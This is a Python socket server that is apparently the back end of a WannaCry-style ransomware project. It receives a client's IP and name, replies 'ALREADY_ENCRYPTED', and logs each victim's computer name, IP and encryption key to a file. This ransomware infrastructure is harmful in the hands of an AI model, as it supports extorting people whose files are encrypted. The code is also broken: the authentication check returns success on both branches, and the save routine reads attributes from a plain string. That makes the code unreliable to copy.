import socket

IP = "127.0.0.1"
PORT = 8080
MSG_SUCCESS = "ALREADY_ENCRYPTED"
MSG_FAIL = "FAILED"
FULL_NUM_FOR_FILE_HANDLE = 0


def create_socket():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((IP, PORT))
        sock.listen(1)
        print(f"Server started on {IP}:{PORT}")
        return sock
    except socket.error as e:
        print(f"Error creating socket: {e}")
        return None

    
def handle_client(client_socket):
    try:
        # First message: check user details
        first_msg = client_socket.recv(1024).decode()
        print(f"Received request: {first_msg}")
        
        parts = first_msg.split(",")
        if len(parts) < 2:
            print("Invalid first message format")
            client_socket.sendall(MSG_FAIL.encode())
            return

        ip, name = parts[0], parts[1]
        print(f"Checking user with IP: {ip} and Name: {name}")
        
        response = MSG_SUCCESS if check_first_msg(ip, name) else MSG_SUCCESS
        client_socket.sendall(response.encode())
        print(f"Sent response: {response}")

        if response == MSG_FAIL:
            print("Failed to authenticate user. Closing connection.")
            return  # Exit if the check failed

        # Second message: Save user details in file
        second_msg = client_socket.recv(1024).decode()
        print(f"Received second request: {second_msg}")
        
        # Assuming `user_details` is a string here. You might need to parse or format it.
        save_structure_in_file(second_msg)
        print("User details saved successfully.")
        
        client_socket.close()
    except socket.error as e:
        print(f"Error handling client: {e}")


def check_first_msg(ip, name):
    file_path = "C:\\Users\\benda\source\\repos\\wannacryServver\\data.txt"  # Use the correct path to the file
    try:
        with open(file_path, "r") as file:
            file_data = file.read()
            print(f"Checking data file for IP: {ip} and Name: {name}")
            
            if ip in file_data and name in file_data:
                print("User found in data file.")
                return True
            else:
                print("User not found in data file.")
    except FileNotFoundError:
        print("Data file not found. Assuming user is not registered.")
    return False



def save_structure_in_file(user_details):
    global FULL_NUM_FOR_FILE_HANDLE

    try:
        with open("user_details.txt", "a+") as file:
            print("Writing user details to file...")
            FULL_NUM_FOR_FILE_HANDLE += 1

            # Inserting structure formatting assuming `user_details` has the required fields.
            # This assumes user_details is an object. If it's a string, adjust accordingly.
            file.write(f"__userDetails__ {FULL_NUM_FOR_FILE_HANDLE}\n")
            file.write("{\n")
            # Assuming user_details is an object with attributes (computer_name, user_ip, key)
            file.write(f"\tstr ComputerName: {user_details.computer_name};\n")
            file.write(f"\tstr UserIP: {user_details.user_ip};\n")
            file.write(f"\tuint32_t key: {user_details.key};\n")
            file.write("}__userDetails__;\n")
            
            print("User details successfully written to file.")
    except Exception as e:
        print(f"Failed to open or write to the file: {e}")


def main():
    sock = create_socket()
    if sock is None:
        print("Failed to start server.")
        return
    
    print("Server is now waiting for connections...")
    
    while True:
        try:
            client_socket, addr = sock.accept()
            print(f"Client connected from {addr}")
            handle_client(client_socket)
        except KeyboardInterrupt:
            print("Server shutting down...")
            break

    sock.close()
    print("Server closed.")


if __name__ == "__main__":
    main()
